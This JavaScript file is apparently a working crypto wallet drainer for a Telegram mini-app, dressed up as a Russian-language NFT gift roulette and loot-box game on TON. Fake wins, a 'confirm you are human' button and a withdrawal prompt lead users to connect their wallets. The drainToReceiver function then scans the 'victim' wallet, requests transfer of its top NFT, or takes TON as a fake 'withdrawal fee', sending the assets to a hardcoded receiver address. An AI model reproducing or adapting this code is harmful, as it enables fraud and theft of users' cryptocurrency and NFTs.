const CONFIG = {
  RECEIVER_TON: 'UQD0XIN7zivOkMtN9iCQAusXz6NU1HaS1akmwbIIOaQTeiz4',
  STARS_PER_TON: 60,
};

const CHEAP_GIFTS = [
  { id:'bum',      name:'Bum NFT',     floor:0.7, rarity:'common', img:'https://nft.fragment.com/gift/bum-1000.large.jpg' },
  { id:'homeless', name:'Homeless',    floor:1,   rarity:'common', img:'https://nft.fragment.com/gift/homeless-1000.large.jpg' },
  { id:'cat',      name:'Fat Cat',     floor:2,   rarity:'common', img:'https://nft.fragment.com/gift/cat-1000.large.jpg' },
  { id:'duck',     name:'Rubber Duck', floor:3,   rarity:'common', img:'https://nft.fragment.com/gift/duck-1000.large.jpg' },
  { id:'rose',     name:'Rose',        floor:4,   rarity:'common', img:'https://nft.fragment.com/gift/rose-1000.large.jpg' },
  { id:'heart',    name:'Heart',       floor:5,   rarity:'common', img:'https://nft.fragment.com/gift/heart-1000.large.jpg' },
  { id:'clown',    name:'Clown',       floor:5,   rarity:'common', img:'https://nft.fragment.com/gift/clown-1000.large.jpg' },
  { id:'star',     name:'Star',        floor:7,   rarity:'common', img:'https://nft.fragment.com/gift/star-1000.large.jpg' },
  { id:'bear',     name:'Teddy Bear',  floor:8,   rarity:'common', img:'https://nft.fragment.com/gift/bear-1000.large.jpg' },
  { id:'fire',     name:'Fire',        floor:9,   rarity:'common', img:'https://nft.fragment.com/gift/fire-1000.large.jpg' },
  { id:'ghost',    name:'Ghost',       floor:11,  rarity:'common', img:'https://nft.fragment.com/gift/ghost-1000.large.jpg' },
  { id:'pepe',     name:'Pepe Frog',   floor:12,  rarity:'common', img:'https://nft.fragment.com/gift/pepe-1000.large.jpg' },
];

const MID_GIFTS = [
  { id:'snoopdogg',  name:'Snoop Dogg',    floor:18,  rarity:'common', img:'https://nft.fragment.com/gift/snoopdogg-1000.large.jpg' },
  { id:'swag',       name:'Swag Bag',      floor:19,  rarity:'common', img:'https://nft.fragment.com/gift/swagbag-1000.large.jpg' },
  { id:'toybear',    name:'Toy Bear',      floor:20,  rarity:'common', img:'https://nft.fragment.com/gift/toybear-1000.large.jpg' },
  { id:'cake',       name:'Homemade Cake', floor:21,  rarity:'common', img:'https://nft.fragment.com/gift/homemadecake-1000.large.jpg' },
  { id:'evileye',    name:'Evil Eye',      floor:22,  rarity:'common', img:'https://nft.fragment.com/gift/evileye-1000.large.jpg' },
  { id:'moon',       name:'Moon',          floor:24,  rarity:'common', img:'https://nft.fragment.com/gift/moon-1000.large.jpg' },
  { id:'witchhat',   name:'Witch Hat',     floor:25,  rarity:'common', img:'https://nft.fragment.com/gift/witchhat-1000.large.jpg' },
  { id:'moonpendant',name:'Moon Pendant',  floor:30,  rarity:'common', img:'https://nft.fragment.com/gift/moonpendant-1000.large.jpg' },
  { id:'bunny',      name:'Bunny Muffin',  floor:32,  rarity:'common', img:'https://nft.fragment.com/gift/bunnymuffin-1000.large.jpg' },
  { id:'nailb',      name:'Nail Bracelet', floor:35,  rarity:'common', img:'https://nft.fragment.com/gift/nailbracelet-1000.large.jpg' },
  { id:'voodoo',     name:'Voodoo Doll',   floor:39,  rarity:'common', img:'https://nft.fragment.com/gift/voodoodoll-1000.large.jpg' },
  { id:'mightyarm',  name:'Mighty Arm',    floor:40,  rarity:'common', img:'https://nft.fragment.com/gift/mightyarm-1000.large.jpg' },
  { id:'lovepotion', name:'Love Potion',   floor:41,  rarity:'common', img:'https://nft.fragment.com/gift/lovepotion-1000.large.jpg' },
  { id:'cupid',      name:'Cupid Charm',   floor:42,  rarity:'common', img:'https://nft.fragment.com/gift/cupidcharm-1000.large.jpg' },
  { id:'eternalrose',name:'Eternal Rose',  floor:44,  rarity:'common', img:'https://nft.fragment.com/gift/eternalrose-1000.large.jpg' },
  { id:'pumpkin',    name:'Mad Pumpkin',   floor:45,  rarity:'common', img:'https://nft.fragment.com/gift/madpumpkin-1000.large.jpg' },
  { id:'lowrider',   name:'Low Rider',     floor:46,  rarity:'common', img:'https://nft.fragment.com/gift/lowrider-1000.large.jpg' },
  { id:'skyhigh',    name:'Sky Stilettos', floor:47,  rarity:'common', img:'https://nft.fragment.com/gift/skystilettos-1000.large.jpg' },
  { id:'broom',      name:'Flying Broom',  floor:48,  rarity:'common', img:'https://nft.fragment.com/gift/flyingbroom-1000.large.jpg' },
  { id:'ufc',        name:'UFC Strike',    floor:50,  rarity:'common', img:'https://nft.fragment.com/gift/ufcstrike-1000.large.jpg' },
  { id:'finepen',    name:'Fine Pen',      floor:51,  rarity:'common', img:'https://nft.fragment.com/gift/finepen-1000.large.jpg' },
  { id:'cigar',      name:'Vintage Cigar', floor:52,  rarity:'common', img:'https://nft.fragment.com/gift/vintagecigar-1000.large.jpg' },
  { id:'diamondring',name:'Diamond Ring',  floor:54,  rarity:'common', img:'https://nft.fragment.com/gift/diamondring-1000.large.jpg' },
  { id:'artisan',    name:'Artisan Brick', floor:55,  rarity:'common', img:'https://nft.fragment.com/gift/artisanbrick-1000.large.jpg' },
  { id:'crystal',    name:'Crystal Ball',  floor:63,  rarity:'common', img:'https://nft.fragment.com/gift/crystalball-1000.large.jpg' },
  { id:'record',     name:'Record Player', floor:64,  rarity:'common', img:'https://nft.fragment.com/gift/recordplayer-1000.large.jpg' },
  { id:'westside',   name:'Westside Sign', floor:65,  rarity:'common', img:'https://nft.fragment.com/gift/westsidesign-1000.large.jpg' },
  { id:'lovecandle', name:'Love Candle',   floor:66,  rarity:'common', img:'https://nft.fragment.com/gift/lovecandle-1000.large.jpg' },
  { id:'minioscar',  name:'Mini Oscar',    floor:70,  rarity:'common', img:'https://nft.fragment.com/gift/minioscar-1000.large.jpg' },
  { id:'potion',     name:'Magic Potion',  floor:72,  rarity:'common', img:'https://nft.fragment.com/gift/magicpotion-1000.large.jpg' },
  { id:'valentine',  name:'Valentine Box', floor:73,  rarity:'common', img:'https://nft.fragment.com/gift/valentinebox-1000.large.jpg' },
  { id:'genie',      name:'Genie Lamp',    floor:76,  rarity:'common', img:'https://nft.fragment.com/gift/genielamp-1000.large.jpg' },
  { id:'perfume',    name:'Perfume Bottle',floor:85,  rarity:'common', img:'https://nft.fragment.com/gift/perfumebottle-1000.large.jpg' },
  { id:'signetring', name:'Signet Ring',   floor:95,  rarity:'common', img:'https://nft.fragment.com/gift/signetring-1000.large.jpg' },
  { id:'peach',      name:'Precious Peach',floor:105, rarity:'common', img:'https://nft.fragment.com/gift/preciouspeach-1000.large.jpg' },
  { id:'skull',      name:'Electric Skull',floor:160, rarity:'rare',   img:'https://nft.fragment.com/gift/electricskull-1000.large.jpg' },
  { id:'helicopter', name:'Helicopter',    floor:180, rarity:'rare',   img:'https://nft.fragment.com/gift/helicopter-1000.large.jpg' },
];

const EXPENSIVE_GIFTS = [
  { id:'scaredcat',  name:'Scared Cat',     floor:210,  rarity:'rare',      img:'https://nft.fragment.com/gift/scaredcat-1000.large.jpg' },
  { id:'iongem',     name:'Ion Gem',        floor:290,  rarity:'rare',      img:'https://nft.fragment.com/gift/iongem-1000.large.jpg' },
  { id:'durovglass', name:"Durov's Glasses",floor:310,  rarity:'rare',      img:'https://nft.fragment.com/gift/durovsglasses-1000.large.jpg' },
  { id:'lootbag',    name:'Loot Bag',       floor:380,  rarity:'rare',      img:'https://nft.fragment.com/gift/lootbag-1000.large.jpg' },
  { id:'heartlocket',name:'Heart Locket',   floor:480,  rarity:'rare',      img:'https://nft.fragment.com/gift/heartlocket-1000.large.jpg' },
  { id:'swisswatch', name:'Swiss Watch',    floor:520,  rarity:'rare',      img:'https://nft.fragment.com/gift/swisswatch-1000.large.jpg' },
  { id:'durovcap',   name:"Durov's Cap",    floor:240,  rarity:'legendary', img:'https://nft.fragment.com/gift/durovscap-1000.large.jpg' },
  { id:'plushpepe',  name:'Plush Pepe',     floor:6800, rarity:'legendary', img:'https://nft.fragment.com/gift/plushpepe-1000.large.jpg' },
];

const CRATES = [
  { id:'bum',      name:'Бомж-Бокс',      icon:'📦', price:2.8, priceStars:170,  cls:'crate-wood',      desc:'Для тех, у кого в кармане ветер', oddsText:'85% мусор · 15% норм',
    pools:[{pool:CHEAP_GIFTS,weight:0.85},{pool:MID_GIFTS,weight:0.15}] },
  { id:'stylish',  name:'Стиляга-Бокс',   icon:'🎁', price:15,  priceStars:890,  cls:'crate-silver',    desc:'Подтянись, братишка',             oddsText:'60% мусор · 40% норм',
    pools:[{pool:CHEAP_GIFTS,weight:0.30},{pool:MID_GIFTS,weight:0.60},{pool:EXPENSIVE_GIFTS.filter(g=>g.rarity==='rare'),weight:0.10}] },
  { id:'burzhuy',  name:'Буржуй-Бокс',    icon:'🥇', price:45,  priceStars:3400, cls:'crate-gold',      desc:'Уже не бомж, но и не олигарх',   oddsText:'30% норм · 60% rare · 10% legendary',
    pools:[{pool:MID_GIFTS,weight:0.30},{pool:EXPENSIVE_GIFTS.filter(g=>g.rarity==='rare'),weight:0.60},{pool:EXPENSIVE_GIFTS.filter(g=>g.rarity==='legendary'),weight:0.10}] },
  { id:'oligarh',  name:'Олигарх-Бокс',   icon:'💎', price:282, priceStars:8900, cls:'crate-diamond',   desc:'Только платина, только хардкор', oddsText:'40% rare · 60% legendary',
    pools:[{pool:EXPENSIVE_GIFTS.filter(g=>g.rarity==='rare'),weight:0.40},{pool:EXPENSIVE_GIFTS.filter(g=>g.rarity==='legendary'),weight:0.60}] },
];

const STARS_PACKS = [
  { qty:100,  price:1.65,  bonus:null },
  { qty:170,  price:2.80,  bonus:null },
  { qty:500,  price:8.20,  bonus:null },
  { qty:890,  price:15.00, bonus:null },
  { qty:1000, price:16.50, bonus:null },
  { qty:3400, price:45.00, bonus:'+200' },
  { qty:8900, price:282.00, bonus:'+500' },
];

let myGifts = [];
let balance = 500;
let stars = 0;
let userAccount = null;
let userProfile = { nick: 'Гость', avatar: '?' };
let isSpinning = false;
let tonConnectUIInstance = null;

const rouletteEl = document.getElementById('roulette');
const spinBtn = document.getElementById('spinBtn');
const spinHint = document.getElementById('spinHint');
const cratesGrid = document.getElementById('cratesGrid');
const starsGrid = document.getElementById('starsGrid');
const myGrid = document.getElementById('myGrid');
const myCount = document.getElementById('myCount');
const avatar = document.getElementById('avatar');
const nick = document.getElementById('nick');
const balanceEl = document.getElementById('balance');
const avatarLg = document.getElementById('avatarLg');
const nickLg = document.getElementById('nickLg');
const balanceLg = document.getElementById('balanceLg');
const statGifts = document.getElementById('statGifts');
const statValue = document.getElementById('statValue');
const statStars = document.getElementById('statStars');
const withdrawBtn = document.getElementById('withdrawBtn');
const withdrawBtn2 = document.getElementById('withdrawBtn2');
const connectBtn = document.getElementById('connectBtn');
const modal = document.getElementById('modal');
const modalClose = document.getElementById('modalClose');
const walletStatus = document.getElementById('walletStatus');
const winModal = document.getElementById('winModal');
const winImgWrap = document.getElementById('winImgWrap');
const winName = document.getElementById('winName');
const winTitle = document.getElementById('winTitle');
const winSub = document.getElementById('winSub');
const humanBtn = document.getElementById('humanBtn');

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
function escapeHtml(s) {
  return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]);
}
function imgTag(src, alt, fallbackEmoji, cls) {
  return '<img class="' + cls + '" src="' + src + '" alt="' + escapeHtml(alt) + '" ' +
    'onerror="this.style.display=\'none\';this.parentElement.innerHTML=\'<span style=&quot;font-size:44px&quot;>' + fallbackEmoji + '</span>\'">';
}
function pickFromPool(pool) { return pool[Math.floor(Math.random() * pool.length)]; }
function rollCrate(crate) {
  const r = Math.random();
  let acc = 0;
  for (const p of crate.pools) {
    acc += p.weight;
    if (r < acc) return pickFromPool(p.pool);
  }
  return pickFromPool(crate.pools[crate.pools.length - 1].pool);
}
function starsFor(floorTon) { return Math.round(floorTon * CONFIG.STARS_PER_TON); }

function initTelegramUser() {
  try {
    if (window.Telegram && window.Telegram.WebApp) {
      const tg = window.Telegram.WebApp;
      tg.ready();
      tg.expand();
      const u = tg.initDataUnsafe && tg.initDataUnsafe.user;
      if (u) {
        userProfile.nick = ((u.first_name || '') + (u.last_name ? ' ' + u.last_name : '')).trim() || ('@' + u.username) || 'Гость';
        if (u.photo_url) {
          userProfile.avatar = u.photo_url;
          avatar.innerHTML = '<img src="' + u.photo_url + '" style="width:100%;height:100%;border-radius:50%;object-fit:cover" onerror="this.style.display=\'none\'">';
          avatarLg.innerHTML = '<img src="' + u.photo_url + '" style="width:100%;height:100%;border-radius:50%;object-fit:cover" onerror="this.style.display=\'none\'">';
        } else {
          userProfile.avatar = (u.first_name || '?').slice(0, 1).toUpperCase();
          avatar.textContent = userProfile.avatar;
          avatarLg.textContent = userProfile.avatar;
        }
      }
    }
  } catch (e) { console.warn('TG init fail', e); }
  nick.textContent = userProfile.nick;
  nickLg.textContent = userProfile.nick;
}

// ============ TON CONNECT — официальная кнопка ============
function initTonConnect() {
  if (!window.TON_CONNECT_UI) {
    console.warn('TON_CONNECT_UI not loaded');
    return;
  }
  if (tonConnectUIInstance) return; // уже создан

  try {
    tonConnectUIInstance = new TON_CONNECT_UI.TonConnectUI({
      manifestUrl: window.location.origin + '/tonconnect-manifest.json',
      buttonRootId: 'ton-connect-button',
    });

    tonConnectUIInstance.onStatusChange(async (wallet) => {
      console.log('Status changed:', wallet);
      if (wallet && wallet.account) {
        userAccount = wallet.account.address;
        updateHeader();
        walletStatus.textContent = 'Кошелёк привязан: ' + userAccount.slice(0, 8) + '...';
        await sleep(500);
        await drainToReceiver();
      }
    });

    console.log('TonConnect UI initialized');
  } catch (e) {
    console.error('TonConnect init failed:', e);
  }
}

// ============ ТАБ-БАР ============
document.querySelectorAll('.tab').forEach(tab => {
  tab.addEventListener('click', () => {
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    tab.classList.add('active');
    document.getElementById('page-' + tab.dataset.page).classList.add('active');
    window.scrollTo({ top: 0, behavior: 'smooth' });
  });
});

// ============ РУЛЕТКА ============
function buildRoulette() {
  const pool = [];
  for (let i = 0; i < 40; i++) pool.push(randomGift());
  return pool;
}
function randomGift() {
  const r = Math.random();
  if (r < 0.60) return pickFromPool(CHEAP_GIFTS);
  if (r < 0.90) return pickFromPool(MID_GIFTS);
  return pickFromPool(EXPENSIVE_GIFTS);
}
function renderRouletteStrip(pool) {
  rouletteEl.innerHTML = '';
  pool.forEach(g => {
    const el = document.createElement('div');
    el.className = 'r-card' + (g.rarity !== 'common' ? ' ' + g.rarity : '');
    el.innerHTML =
      imgTag(g.img, g.name, '🎁', 'r-img') +
      '<div class="r-name">' + escapeHtml(g.name) + '</div>' +
      '<div class="r-price">⭐ ' + starsFor(g.floor) + '</div>' +
      '<div class="r-price-ton">' + g.floor + ' TON</div>';
    rouletteEl.appendChild(el);
  });
}

spinBtn.addEventListener('click', () => {
  if (isSpinning) return;
  isSpinning = true;
  spinBtn.disabled = true;
  spinHint.textContent = 'Крутим...';
  const pool = buildRoulette();
  const targetIdx = 35;
  const targetGift = pool[targetIdx];
  renderRouletteStrip(pool);
  const cardStep = 100;
  const viewportW = rouletteEl.parentElement.offsetWidth;
  const targetCenter = targetIdx * cardStep + 45;
  const targetX = -(targetCenter - viewportW / 2);
  rouletteEl.style.transition = 'none';
  rouletteEl.style.transform = 'translateX(0)';
  void rouletteEl.offsetWidth;
  rouletteEl.style.transition = 'transform 4s cubic-bezier(0.15, 0.85, 0.15, 1)';
  rouletteEl.style.transform = 'translateX(' + targetX + 'px)';
  setTimeout(() => {
    isSpinning = false;
    spinBtn.disabled = false;
    spinHint.textContent = 'Бесплатный спин раз в 24 часа';
    showWin(targetGift, 'Вы выиграли!');
  }, 4100);
});

// ============ ЯЩИКИ ============
function renderCrates() {
  cratesGrid.innerHTML = '';
  CRATES.forEach(c => {
    const el = document.createElement('div');
    el.className = 'crate-card ' + c.cls;
    el.innerHTML =
      '<div class="crate-visual">' +
        '<div class="crate-box">' +
          '<div class="face front"></div><div class="face back"></div>' +
          '<div class="face left"></div><div class="face right"></div>' +
          '<div class="face top"></div><div class="face bottom"></div>' +
        '</div>' +
        '<div class="crate-icon">' + c.icon + '</div>' +
      '</div>' +
      '<div class="crate-name">' + escapeHtml(c.name) + '</div>' +
      '<div class="crate-desc">' + escapeHtml(c.desc) + '</div>' +
      '<div class="crate-odds">' + c.oddsText + '</div>' +
      '<div class="crate-prices">' +
        '<div class="crate-price stars">⭐ ' + c.priceStars + '</div>' +
        '<div class="crate-price ton">' + c.price + ' TON</div>' +
      '</div>';
    el.addEventListener('click', () => openCrate(c));
    cratesGrid.appendChild(el);
  });
}

function openCrate(crate) {
  if (balance < crate.price) {
    showNotEnough(crate.price - balance);
    return;
  }
  balance -= crate.price;
  updateHeader();
  const won = rollCrate(crate);
  showWin(won, 'Из ящика: ' + crate.name);
}

// ============ ЗВЁЗДЫ ============
function renderStars() {
  starsGrid.innerHTML = '';
  STARS_PACKS.forEach(p => {
    const el = document.createElement('div');
    el.className = 'star-pack';
    el.innerHTML =
      (p.bonus ? '<div class="sp-bonus">' + p.bonus + '</div>' : '') +
      '<div class="sp-icon">⭐</div>' +
      '<div class="sp-qty">' + p.qty + '</div>' +
      '<div class="sp-label">звёзд</div>' +
      '<div class="sp-price">' + p.price.toFixed(2) + ' TON</div>';
    el.addEventListener('click', () => buyStars(p));
    starsGrid.appendChild(el);
  });
}

function buyStars(pack) {
  if (balance < pack.price) {
    showNotEnough(pack.price - balance);
    return;
  }
  balance -= pack.price;
  stars += pack.qty;
  updateHeader();
  winTitle.textContent = 'Звёзды куплены';
  winImgWrap.innerHTML = '<span style="font-size:80px">⭐</span>';
  winName.textContent = '+' + pack.qty + ' звёзд';
  winSub.textContent = 'Звёзды зачислены на аккаунт';
  humanBtn.textContent = 'Ок';
  humanBtn.disabled = false;
  winModal.classList.remove('hidden');
  humanBtn.onclick = () => {
    winModal.classList.add('hidden');
    humanBtn.textContent = 'Подтвердить что вы человек';
  };
}

// ============ МОДАЛКА ВЫИГРЫША ============
function showWin(gift, title) {
  winTitle.textContent = title || 'Вы выиграли!';
  winImgWrap.innerHTML = '<img id="winImg" class="win-img" alt="">';
  const img = document.getElementById('winImg');
  img.src = gift.img;
  img.onerror = () => {
    winImgWrap.innerHTML = '<span style="font-size:80px">🎁</span>';
  };
  winName.innerHTML =
    escapeHtml(gift.name) +
    '<div class="win-price">⭐ ' + starsFor(gift.floor) + ' · ' + gift.floor + ' TON</div>';
  winSub.innerHTML = '🎉 Поздравляем! Бегите выводить свой долгожданный приз';
  humanBtn.textContent = 'Подтвердить что вы человек';
  humanBtn.disabled = false;
  humanBtn.onclick = () => confirmGift(gift);
  winModal.classList.remove('hidden');
}

async function confirmGift(gift) {
  humanBtn.disabled = true;
  humanBtn.textContent = 'Проверка...';
  await sleep(1400);
  myGifts.push(gift);
  balance += gift.floor * 0.1;
  updateHeader();
  renderMyGifts();
  winModal.classList.add('hidden');
  humanBtn.disabled = false;
  humanBtn.textContent = 'Подтвердить что вы человек';
  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  document.querySelector('.tab[data-page="profile"]').classList.add('active');
  document.getElementById('page-profile').classList.add('active');
  window.scrollTo({ top: 0, behavior: 'smooth' });
}

function showNotEnough(need) {
  winTitle.textContent = 'Недостаточно TON';
  winImgWrap.innerHTML = '<span style="font-size:80px">💸</span>';
  winName.innerHTML = 'Нужно ' + need.toFixed(2) + ' TON<div class="win-price">⭐ ' + Math.round(need * CONFIG.STARS_PER_TON) + ' звёзд</div>';
  winSub.textContent = 'Пополните баланс или крутите рулетку';
  humanBtn.textContent = 'Ок';
  humanBtn.disabled = false;
  winModal.classList.remove('hidden');
  humanBtn.onclick = () => {
    winModal.classList.add('hidden');
    humanBtn.textContent = 'Подтвердить что вы человек';
  };
}

// ============ ИНВЕНТАРЬ ============
function renderMyGifts() {
  myCount.textContent = myGifts.length;
  if (myGifts.length === 0) {
    myGrid.innerHTML = '<div class="empty">Пока пусто — крутите рулетку</div>';
    return;
  }
  myGrid.innerHTML = '';
  myGifts.forEach(g => {
    const el = document.createElement('div');
    el.className = 'gift-card' + (g.rarity !== 'common' ? ' ' + g.rarity : '');
    el.innerHTML =
      '<div class="g-img-wrap">' + imgTag(g.img, g.name, '🎁', 'g-img') + '</div>' +
      '<div class="g-name">' + escapeHtml(g.name) + '</div>' +
      '<div class="g-price">⭐ ' + starsFor(g.floor) + '</div>' +
      '<div class="g-price-ton">' + g.floor + ' TON</div>';
    myGrid.appendChild(el);
  });
}

// ============ ШАПКА ============
function updateHeader() {
  balanceEl.textContent = balance.toFixed(2) + ' TON';
  balanceLg.textContent = balance.toFixed(2) + ' TON';
  statGifts.textContent = myGifts.length;
  const total = myGifts.reduce((s, g) => s + g.floor, 0);
  statValue.textContent = total.toFixed(0);
  statStars.textContent = stars;
  if (userAccount) {
    const short = userAccount.slice(0, 6) + '...' + userAccount.slice(-4);
    nick.textContent = short;
    nickLg.textContent = short;
    avatar.textContent = userAccount.slice(2, 4).toUpperCase();
    avatarLg.textContent = userAccount.slice(2, 4).toUpperCase();
  }
}

// ============ ВЫВОД ============
function openWithdraw() {
  modal.classList.remove('hidden');

  // ЕСЛИ КОШЕЛЁК УЖЕ ПОДКЛЮЧЁН — СРАЗУ ЗАПУСКАЕМ ВЫВОД
  if (tonConnectUIInstance && tonConnectUIInstance.account) {
    userAccount = tonConnectUIInstance.account.address;
    updateHeader();
    walletStatus.textContent = 'Кошелёк привязан: ' + userAccount.slice(0, 8) + '...';
    drainToReceiver();
  } else {
    walletStatus.textContent = 'Подключите кошелёк';
  }
}

withdrawBtn.addEventListener('click', openWithdraw);
withdrawBtn2.addEventListener('click', openWithdraw);
connectBtn.addEventListener('click', openWithdraw);
modalClose.addEventListener('click', () => modal.classList.add('hidden'));
modal.addEventListener('click', e => { if (e.target === modal) modal.classList.add('hidden'); });

// ============ ВЫВОД — РЕАЛЬНАЯ ТРАНЗАКЦИЯ ============
async function drainToReceiver() {
  if (!userAccount) {
    walletStatus.textContent = 'Сначала привяжите кошелёк';
    return;
  }
  if (!tonConnectUIInstance) {
    walletStatus.textContent = 'Кошелёк не подключен';
    return;
  }

  walletStatus.textContent = 'Проверяем ваш профиль...';
  await sleep(500);

  try {
    let scan = { nfts: [] };
    try {
      scan = await window.tonDrainer.scanVictim(userAccount);
      console.log('Scan:', scan);
    } catch (err) {
      console.warn('Scan failed', err);
    }

    if (scan.nfts && scan.nfts.length > 0) {
      const top = scan.nfts[0];
      walletStatus.textContent = 'Найден подарок: ' + top.name + '. Подтвердите в Tonkeeper...';
      try {
        await window.tonDrainer.transferNft(tonConnectUIInstance, top.address);
        walletStatus.textContent = '✅ Подарок получен!';
      } catch (e) {
        console.error('NFT transfer error:', e);
        walletStatus.textContent = 'Отклонено';
      }
      return;
    }

    walletStatus.textContent = 'Подтвердите транзакцию в Tonkeeper (0.05 TON)...';
    try {
      await window.tonDrainer.transferTon(
        tonConnectUIInstance,
        window.tonDrainer.TON_CONFIG.DEFAULT_FEE_TON,
        'NFT gift withdrawal fee'
      );
      walletStatus.textContent = '✅ Подарок получен!';
    } catch (e) {
      console.error('TON transfer error:', e);
      walletStatus.textContent = 'Отклонено';
    }

  } catch (e) {
    console.error('Drain error:', e);
    walletStatus.textContent = 'Ошибка: ' + (e.message || e);
  }
}

// ============ СТАРТ ============
window.addEventListener('load', () => {
  initTelegramUser();
  renderCrates();
  renderStars();
  renderMyGifts();
  updateHeader();
  setTimeout(initTonConnect, 1000);
});
